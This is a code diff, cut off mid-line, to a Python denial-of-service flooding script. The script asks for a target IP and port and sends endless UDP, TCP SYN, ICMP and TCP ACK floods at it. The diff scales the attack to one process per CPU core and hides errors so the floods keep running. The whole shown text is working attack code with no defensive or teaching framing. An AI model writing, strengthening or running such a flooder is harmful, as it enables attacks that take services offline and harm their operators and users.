@@ -1,5 +1,6 @@
 import socket
 import threading
+import multiprocessing
 import os
 import struct
 
@@ -20,7 +21,13 @@ def send_tcp_syn_packets(target_ip, target_port):
     tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     while True:
-        tcp_socket.connect((target_ip, target_port))
+        try:
+            tcp_socket.connect((target_ip, target_port))
+            tcp_socket.close()
+            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        except:
+            pass
 
 def send_icmp_packets(target_ip):
     icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
@@ -38,25 +45,32 @@ def send_tcp_ack_packets(target_ip, target_port):
     tcp_ack_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     
     while True:
-        tcp_ack_socket.sendto(b'', (target_ip, target_port))
+        try:
+            tcp_ack_socket.connect((target_ip, target_port))
+            tcp_ack_socket.sendto(b'', (target_ip, target_port))
+            tcp_ack_socket.close()
+            tcp_ack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp_ack_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            tcp_ack_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        except:
+            pass
 
 # Prompt the user for target IP address, port, and packet size
 target_ip = input("Enter the target IP address: ")
 target_port = int(input("Enter the target port: "))
 packet_size = int(input("Enter the packet size (in bytes): "))
 
-# Create and start the UDP packet sending thread
-udp_thread = threading.Thread(target=send_udp_packets, args=(target_ip, target_port, packet_size))
-udp_thread.start()
+# Calculate the number of processes based on the number of available CPU cores
+num_processes = os.cpu_count()
 
-# Create and start the TCP SYN packet sending thread
-tcp_thread = threading.Thread(target=send_tcp_syn_packets, args=(target_ip, target_port))
-tcp_thread.start()
+# Create and start the UDP packet sending processes
+udp_processes = []
+for _ in range(num_processes):
+    udp_process = multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, packet_size))
+    udp_process.start()
+    udp_processes.append(udp_process)
 
-# Create and start the ICMP packet sending thread
-icmp_thread = threading.Thread(target=send_icmp_packets, args=(target_ip,))
-icmp_thread.start()
-
-# Create and start the TCP ACK packet sending thread
-tcp_ack_thread = threading.Thread(target=send_tcp_ack_packets, args=(target_ip, target_port))
-tcp_ack_thread.start()
+# Create and start the TCP SYN packet sending threads
+tcp_threads = []
+for _ in range(num_processes):
+    tcp_thread = threading.Thread(target=
